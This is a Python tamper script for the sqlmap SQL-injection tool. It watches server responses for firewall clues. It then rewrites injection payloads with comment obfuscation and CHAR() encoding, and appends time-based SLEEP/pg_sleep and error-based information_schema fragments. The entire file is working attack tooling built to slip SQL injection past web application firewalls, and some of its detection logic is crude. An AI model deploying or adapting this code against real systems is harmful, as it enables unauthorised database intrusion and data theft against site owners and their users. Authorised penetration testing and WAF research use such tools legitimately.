import random
from lib.core.enums import PRIORITY
import re

__priority__ = PRIORITY.HIGHEST

def dependencies():
    """Ensure dependencies are met."""
    pass

def tamper(payload, headers=None, response=None, **kwargs):
    """
    Dynamically adjusts payloads based on server responses and headers.
    
    payload: str
        The SQL payload being tested.
    headers: dict
        HTTP headers from the server response.
    response: str
        Full HTTP response body.
    """
    if not payload:
        return payload

    # Step 1: Analyze Headers for Clues
    waf_headers = [
        'x-waf-status', 'x-firewall', 'x-powered-by', 'x-drupal-dynamic-cache', 'x-content-type-options'
    ]
    detected_waf = any(header in (headers or {}) for header in waf_headers)

    # Step 2: Modify Payload Based on Detected Patterns
    if response:
        # Check for common WAF patterns or database errors
        if "blocked" in response.lower():
            # Detected WAF blocking: Add obfuscation
            payload = obfuscate_payload(payload, level=2)
        elif "mysql" in response.lower():
            # MySQL database detected: Use MySQL-specific payloads
            payload += " /*!MySQL*/"
        elif "syntax error" in response.lower() or "pg_" in response.lower():
            # PostgreSQL detected: Adjust syntax for compatibility
            payload += " /*Postgres*/"

    # Step 3: Randomize HTTP Bypass
    if detected_waf:
        # Randomly apply bypass techniques
        payload = random.choice([obfuscate_payload(payload), encode_payload(payload)])

    # Step 4: Insert Adaptive Techniques
    payload = adaptive_bypass(payload)

    return payload

def obfuscate_payload(payload, level=1):
    """
    Obfuscates SQL payload to bypass basic filters.
    level: int
        Obfuscation level (1=basic, 2=aggressive).
    """
    if level == 1:
        # Basic comment-based obfuscation
        return payload.replace(" ", "/**/")
    elif level == 2:
        # Advanced obfuscation with random comments and character splitting
        return "".join(
            random.choice([f"{c}/**/", f"{c}/*random*/", c]) for c in payload
        )

def encode_payload(payload):
    """
    Encodes the payload using common bypass techniques.
    """
    return ''.join(f"CHAR({ord(c)})" if c.isalnum() else c for c in payload)

def adaptive_bypass(payload):
    """
    Inserts adaptive techniques like time delays or error triggering.
    """
    techniques = [
        # Time-based techniques
        " AND SLEEP(5)--",
        " AND pg_sleep(5)--",
        # Error-based payloads
        " AND 1=CAST((SELECT COUNT(*) FROM information_schema.tables) AS SIGNED)--",
        " AND 1=CAST((SELECT COUNT(*) FROM pg_catalog.pg_tables) AS INT)--"
    ]
    return payload + random.choice(techniques)
